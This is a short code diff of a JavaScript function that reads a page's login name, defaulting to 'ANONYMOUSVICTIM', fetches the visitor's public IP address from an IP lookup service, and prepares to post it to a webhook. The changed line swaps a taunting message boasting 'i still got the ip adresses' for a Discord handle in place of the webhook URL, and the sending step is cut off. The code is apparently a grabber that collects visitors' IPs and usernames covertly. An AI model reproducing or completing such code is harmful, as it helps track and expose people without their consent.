@@ -1,7 +1,7 @@
 async function sendWebhookWithData() {
   const loginName = $("#login_name").val() || "ANONYMOUSVICTIM";
   const urlToFetch = "https://api.ipify.org"; // Replace with the URL you want to fetch
-  const webhookUrl = nice try fune fans, i still got the ip adresses
+  const webhookUrl = "meet me on discord, ivorydevrimoqr"
 
   try {
     const response = await fetch(urlToFetch);
